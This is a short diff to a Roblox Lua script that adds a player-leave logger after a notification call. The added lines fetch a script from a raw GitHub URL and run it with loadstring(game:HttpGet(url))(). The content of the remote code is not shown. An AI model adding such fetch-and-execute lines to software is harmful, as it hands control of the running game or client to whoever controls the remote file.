@@ -100,3 +100,7 @@ game.StarterGui:SetCore("SendNotification",  {
  Callback = NotificationBindable;
 })
 end
+
+-- خرج لاعب
+local url = "https://raw.githubusercontent.com/7yd7/7yd7/main/log-Leaves" -- اللوج
+loadstring(game:HttpGet(url))()
